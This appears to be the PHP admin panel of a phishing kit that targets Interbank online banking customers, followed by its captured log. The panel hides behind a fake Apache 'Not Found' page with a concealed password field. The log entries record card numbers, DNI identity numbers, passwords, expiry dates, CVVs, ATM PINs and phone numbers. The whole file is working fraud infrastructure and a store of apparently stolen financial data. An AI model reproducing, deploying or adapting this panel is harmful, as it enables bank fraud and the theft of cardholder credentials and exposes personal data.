<?php
error_reporting(0);
session_start();
$auth_pass = "32d373cd1bcf35569d782d6f9933b147";
$x = $_GET["rlz"]; if ($x == ""){ $x = "true"; }
else{ $x; } $pass = $x;
if($pass == "true"){
if(!isset($_SESSION["logueado"])) {
if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))) {
$_SESSION["logueado"] = true;
}else { panel(); }}}
function panel() {
	die(" <h1>Not Found</h1>
    <p>The requested URL $_SERVER[HTTP_HOST].$_SERVER[REQUEST_URI] was not found on this server.</p>
    <hr>
    <address>Apache/2.4.12 (Unix) OpenSSL/1.0.1e-fips mod_bwlimited/1.4 Server at $_SERVER[HTTP_HOST] Port 80</address>
        <style>
            input { margin:0;border:1px solid #fff; }
        </style>
	<pre align=center><br><br><br><br><br><br><br><br><br><br><br><form method=post><input type=\"password\" name=\"pass\" size=\"2\" maxlength=\"6\" style=\"outline:none; border:none; color: #000;\">
</form></pre>"); }
/*=================================*/
if($_GET["opc"] == "salir") { 
/*=================================*/
session_start();
session_destroy();
$file = basename($_SERVER['PHP_SELF']);
echo "<script type=\"text/javascript\">document.location = \"$file\";</script>"; }
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<script language="JavaScript">
function Salir(){
	var __confirm = confirm("Vuelve Pronto");
	if( !__confirm ){ return false ; }
	window.location = "<?=basename($_SERVER['PHP_SELF']);?>";
}
</script>
</head>
<body>
<a href="?opc=salir" onClick="Salir();" style="float:left;"><font face="Verdana" size="2" color="#E10000">Logout</font></a><br />-------------------- [::1] --------------------<br /><br />
Interbank Login26/05/2019 18:45:51<br><br>

Acceso: [Cliente -   ][Card - 4213  5500  3626  8965] [DNI - 56576576] [Clave - EEYFFFFHHH]<br><br>

Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36<br><br>
------------------------------------------------------------------------<br>
https://bancaporinternet.interbank.pe/<br>
------------------------------------------------------------------------<br /><br />-------------------- [::1] --------------------<br /><br />
Interbank Card 26/05/2019 18:46:33<br><br>

Acceso: [Cliente - Cliente][Card - 4213550089263742] [DNI - 56576576] [Clave - EEYFFFFHHH]<br><br>

Datos CC: [Card - 4213550089263742] [Exp - 08/23] [Cvv - 234][ATM - 2342][Claro - 968542177]<br><br>
------------------------------------------------------------------------<br>
https://bancaporinternet.interbank.pe/<br>
------------------------------------------------------------------------<br /><br />-------------------- [::1] --------------------<br /><br />
Interbank Login 06/07/2019 11:08:18<br><br>

